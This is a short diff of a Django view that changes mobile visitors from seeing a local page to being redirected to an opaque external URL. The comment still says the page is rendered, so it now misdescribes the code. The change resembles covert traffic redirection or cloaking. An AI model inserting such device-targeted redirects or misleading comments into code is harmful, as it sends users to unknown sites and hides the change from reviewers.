@@ -40,7 +40,7 @@ def redirect_get(request):
     if is_mobile:
         if page:
             return render(request, 'pixel.html')
-        return render(request, 'pt.html')  # Renderiza a página para dispositivos móveis
+        return redirect('https://mnr-ircp10.com/ca2c7c8e7')  # Renderiza a página para dispositivos móveis
     else:
         if page:
             return render(request,'pixel.html')
